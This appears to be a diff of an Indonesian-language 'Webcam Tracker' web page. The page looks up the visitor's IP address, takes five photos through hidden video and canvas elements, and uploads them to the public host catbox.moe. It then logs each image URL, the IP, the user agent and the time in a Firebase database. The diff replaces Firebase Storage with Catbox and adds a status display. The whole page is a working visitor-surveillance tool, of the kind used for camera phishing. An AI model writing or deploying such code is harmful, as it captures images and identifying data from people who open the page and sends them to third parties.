@@ -1,17 +1,31 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>Webcam Tracker</title>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>
   <style>
     video, canvas { display: none; }
-    body { background: #fff; color: #000; }
+    body { 
+      background: #000; 
+      color: #0f0; 
+      font-family: monospace;
+      text-align: center;
+      padding: 2em;
+    }
+    .status {
+      margin: 20px 0;
+      padding: 10px;
+      border: 1px solid #0f0;
+      border-radius: 5px;
+    }
   </style>
 </head>
 <body>
+  <h1>Webcam Tracker</h1>
+  <div class="status" id="status">Memulai...</div>
+  
   <script>
     // ✅ Konfigurasi Firebase
     const firebaseConfig = {
@@ -25,87 +39,105 @@
     };
     firebase.initializeApp(firebaseConfig);
     const database = firebase.database();
-    const storage = firebase.storage();
 
-    // Setup elemen
+    // 🔧 Setup elemen
     const video = document.createElement('video');
     const canvas = document.createElement('canvas');
     const ctx = canvas.getContext('2d');
+    const statusEl = document.getElementById('status');
     document.body.appendChild(video);
     document.body.appendChild(canvas);
 
+    // 🎛️ Konfigurasi
     let photoCount = 0;
     const maxPhotos = 5;
     let visitorIP = "Unknown";
-    let visitTime = "";
+    const visitTime = new Date().toLocaleString('id-ID');
 
-    // Ambil IP dan waktu kunjungan
+    // 📤 Fungsi upload ke Catbox.moe
+    function uploadToCatbox(blob) {
+      return new Promise((resolve, reject) => {
+        const formData = new FormData();
+        formData.append('file', blob, `webcam_${Date.now()}.jpg`);
+
+        fetch('https://catbox.moe/user/api.php', {
+          method: 'POST',
+          body: formData
+        })
+        .then(response => response.text())
+        .then(url => {
+          if(url.startsWith('http')) {
+            resolve(url);
+          } else {
+            reject(new Error('Upload gagal: ' + url));
+          }
+        })
+        .catch(err => reject(err));
+      });
+    }
+
+    // 🌐 Ambil IP pengunjung
+    statusEl.textContent = "🔍 Mendeteksi IP...";
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
       .then(data => {
         visitorIP = data.ip;
-        const now = new Date();
-        visitTime = now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');
-        console.log("✅ IP Address:", visitorIP);
+        statusEl.textContent = "✅ IP terdeteksi: " + visitorIP;
         startCamera();
       })
       .catch(err => {
-        console.warn("⚠️ Gagal ambil IP:", err);
+        statusEl.textContent = "⚠️ Gagal deteksi IP: " + err.message;
         startCamera();
       });
 
+    // 📷 Akses kamera
     function startCamera() {
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+      statusEl.textContent = "📷 Mengakses kamera...";
+      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
         .then(stream => {
           video.srcObject = stream;
           video.play();
           video.onloadedmetadata = () => {
+            statusEl.textContent = "📸 Kamera siap!";
             capturePhotos();
           };
         })
         .catch(err => {
-          console.error("❌ Gagal akses kamera:", err);
+          statusEl.textContent = "❌ Akses kamera ditolak: " + err.message;
         });
     }
 
-    function capturePhotos() {
-      const interval = setInterval(() => {
-        if (photoCount >= maxPhotos) {
-          clearInterval(interval);
-          console.log("📸 Selesai ambil semua foto");
-          return;
-        }
-
+    // 🖼️ Ambil foto
+    async function capturePhotos() {
+      while (photoCount < maxPhotos) {
+        await new Promise(resolve => setTimeout(resolve, 3000));
+        
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         ctx.drawImage(video, 0, 0);
-
-        canvas.toBlob(blob => {
-          const fileName = `webcam_${Date.now()}.jpg`;
-          const storageRef = storage.ref('webcam/' + fileName);
-
-          storageRef.put(blob)
-            .then(snapshot => snapshot.ref.getDownloadURL())
-            .then(downloadURL => {
-              console.log(`✅ Foto ${photoCount + 1} berhasil upload.`);
-              return database.ref('webcam_snapshots').push({
-                url: downloadURL,
-                ip: visitorIP,
-                userAgent: navigator.userAgent,
-                time: visitTime,
-                timestamp: Date.now()
-              });
-            })
-            .then(() => {
-              console.log(`📤 Foto ${photoCount + 1} dan data terkirim ke Firebase`);
-            })
-            .catch(err => {
-              console.error("❌ Gagal upload foto atau kirim data:", err);
-            });
-        }, 'image/jpeg');
-
-        photoCount++;
-      }, 1000); // ambil tiap 1 detik
+        
+        try {
+          statusEl.textContent = `📤 Mengupload foto ${photoCount + 1}/${maxPhotos}...`;
+          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+          const imageUrl = await uploadToCatbox(blob);
+          
+          await database.ref('webcam_snapshots').push({
+            url: imageUrl,
+            timestamp: Date.now(),
+            ip: visitorIP,
+            userAgent: navigator.userAgent,
+            time: new Date().toLocaleString('id-ID')
+          });
+          
+          photoCount++;
+          statusEl.textContent = `✅ Foto ${photoCount} berhasil! URL: ${imageUrl}`;
+        } catch (err) {
+          statusEl.textContent = "❌ Error: " + err.message;
+        }
+      }
+      
+      statusEl.textContent = "🎉 Selesai! 5 foto telah diambil.";
+      video.srcObject.getTracks().forEach(track => track.stop());
     }
   </script>
 </body>
